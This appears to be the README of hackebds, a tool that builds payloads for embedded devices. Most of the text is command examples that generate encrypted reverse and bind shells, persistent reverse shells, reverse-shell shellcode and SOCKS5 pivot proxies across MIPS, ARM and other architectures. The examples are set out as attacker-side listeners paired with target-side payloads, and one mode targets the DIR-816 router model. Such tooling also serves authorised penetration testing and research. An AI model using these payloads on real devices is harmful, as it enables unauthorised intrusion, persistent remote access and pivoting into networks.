# hackebds
![PyPI - Wheel](https://img.shields.io/pypi/wheel/hackebds)![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pwntools)
[![Downloads](https://static.pepy.tech/badge/hackebds)](https://pepy.tech/project/hackebds)

## 简介

`hackebds` 是一个面向嵌入式设备的 payload 生成、加密 shell、SOCKS5 代理和设备信息整理工具。

当前版本中，加密 shell / 代理的推荐工作流已经统一为 **纯 ELF 模式**：

- `reverse_shell_file` + `encrypted_shell_server` / `reverse_shell_server`
- `bind_shell` + `bind_shell_client`
- `reverse_proxy_file` + `reverse_proxy_server`
- `forward_proxy_file`

## 新版本主要变化

- 新增全架构加密反向 shell 和加密 bind shell
- 新增 `encrypted_shell_server` / `reverse_shell_server` ELF 监听端，不再依赖 Python handler
- 新增 `bind_shell_client` ELF 连接端，用于连接 `bind_shell`
- 新增纯 ELF 的反向 SOCKS5 代理和正向 SOCKS5 代理
- 加密流量支持 `chacha20` 与 `aes`
- 监听端 ELF 支持 `-bind_ip`
- 回连型 payload 继续只使用 `-reverse_ip`，不绑定本地监听 IP

## 安装

```bash
python3 -m pip install -U hackebds
```

本地开发安装：

```bash
git clone https://github.com/doudoudedi/hackEmbedded
cd hackEmbedded
python3 -m pip install -e .
```

## 在其他机器上重新打包

如果要把源码上传到 x86 机器上重新构建 wheel，可以使用源码 zip 和 `build_release.py`：

```bash
unzip hackebds-0.4.3-source-for-x86-build.zip
cd hackebds-0.4.0.backup-20260411T142751Z
python3 -m pip install -U pip setuptools wheel cython
python3 build_release.py --plat manylinux2014_x86_64
```

## 依赖的 binutils

生成非本机架构 ELF 前，请先安装对应架构的 binutils：

```bash
sudo apt install binutils-aarch64-linux-gnu
sudo apt install binutils-arm-linux-gnueabi
sudo apt install binutils-mips-linux-gnu
sudo apt install binutils-mipsel-linux-gnu
sudo apt install binutils-mips64-linux-gnuabi64
sudo apt install binutils-mips64el-linux-gnuabi64
sudo apt install binutils-powerpc-linux-gnu
sudo apt install binutils-riscv64-linux-gnu
```

macOS 可使用 pwntools-binutils：

```bash
brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-$ARCH.rb
```

## 使用示例

### 1）加密反向 shell

攻击端：

```bash
hackebds -arch x64 -res encrypted_shell_server \
  -reverse_port 4444 \
  -bind_ip 192.168.56.1 \
  -cipher chacha20 -encrypt_key "demo-key" \
  -filename reverse_server.elf

chmod +x reverse_server.elf
./reverse_server.elf
```

目标端：

```bash
hackebds -arch mipsel -res reverse_shell_file \
  -reverse_ip 192.168.56.1 -reverse_port 4444 \
  -cipher chacha20 -encrypt_key "demo-key" \
  -filename reverse_payload.elf

chmod +x reverse_payload.elf
./reverse_payload.elf
```

说明：

- `reverse_shell_file` 不支持 `-bind_ip`
- `encrypted_shell_server` 支持 `-bind_ip`
- 如需 AES，把 `-cipher chacha20` 改成 `-cipher aes`

### 2）加密 bind shell

目标端：

```bash
hackebds -arch aarch64 -res bind_shell \
  -bind_port 5555 \
  -bind_ip 192.168.56.20 \
  -passwd "s3cr3t" \
  -cipher chacha20 -encrypt_key "demo-key" \
  -filename bind_shell.elf

chmod +x bind_shell.elf
./bind_shell.elf
```

攻击端：

```bash
hackebds -arch x64 -res bind_shell_client \
  -reverse_ip 192.168.56.20 -reverse_port 5555 \
  -cipher chacha20 -encrypt_key "demo-key" \
  -filename bind_client.elf

chmod +x bind_client.elf
./bind_client.elf
```

连接后输入：

```text
s3cr3t
id
uname -a
exit
```

### 3）持久化加密反向 shell

监听端：

```bash
hackebds -arch x64 -res encrypted_shell_server --power \
  -reverse_port 4444 \
  -bind_ip 192.168.56.1 \
  -cipher chacha20 -encrypt_key "demo-key" \
  -filename power_server.elf

./power_server.elf
```

payload：

```bash
hackebds -arch armelv7 -res reverse_shell_file --power -sleep 10 \
  -reverse_ip 192.168.56.1 -reverse_port 4444 \
  -cipher chacha20 -encrypt_key "demo-key" \
  -filename power_payload.elf
```

### 4）加密反向 SOCKS5 代理

服务端：

```bash
hackebds -arch x64 -res reverse_proxy_server \
  -agent_port 7000 -socks_port 1080 \
  -bind_ip 192.168.56.1 \
  -cipher chacha20 -encrypt_key "demo-key" \
  -filename reverse_proxy_server.elf

chmod +x reverse_proxy_server.elf
./reverse_proxy_server.elf
```

Agent：

```bash
hackebds -arch mips64el -res reverse_proxy_file \
  -reverse_ip 192.168.56.1 -reverse_port 7000 \
  -cipher chacha20 -encrypt_key "demo-key" \
  -filename reverse_proxy_agent.elf

chmod +x reverse_proxy_agent.elf
./reverse_proxy_agent.elf
```

测试：

```bash
curl --socks5-hostname 127.0.0.1:1080 http://example.com/
```

带认证的服务端：

```bash
hackebds -arch x64 -res reverse_proxy_server \
  -agent_port 7000 -socks_port 1080 \
  -bind_ip 192.168.56.1 \
  -socks_auth user:pass \
  -cipher aes -encrypt_key "demo-key" \
  -filename reverse_proxy_server_auth.elf
```

UDP 说明：

- 反向 SOCKS5 代理在已实现的非 SPARC 路径中支持 UDP
- `sparc` / `sparc64` 不应视为 UDP 已支持

### 5）正向 SOCKS5 代理

```bash
hackebds -arch x64 -res forward_proxy_file \
  -listen_port 1081 \
  -bind_ip 192.168.56.1 \
  -filename forward_proxy.elf

chmod +x forward_proxy.elf
./forward_proxy.elf
```

测试：

```bash
curl --socks5-hostname 127.0.0.1:1081 http://example.com/
```

### 6）生成 reverse shellcode

```bash
hackebds -arch armelv7 -res reverse_shellcode \
  -reverse_ip 192.168.56.1 -reverse_port 4444
```

### 7）使用 `-model`

```bash
hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 \
  -model DIR-816 -res reverse_shell_file
```

### 8）使用 `--mcpu`

```bash
hackebds -mcpu mips32r2 -li -arch mipsel \
  -reverse_ip 127.0.0.1 -reverse_port 9999 \
  -res reverse_shell_file
```

### 9）使用 `--firmware`

```bash
hackebds --firmware ./firmware.bin
```

## 使用说明

- `-bind_ip` 只用于监听端 ELF
- `reverse_shell_file` 和 `reverse_proxy_file` 是主动连接的 payload，不绑定本地监听 IP
- `reverse_proxy_server` 和 `forward_proxy_file` 支持 `-bind_ip`
- 加密 shell / 代理示例同时适用于 `chacha20` 和 `aes`，前提是两端参数一致
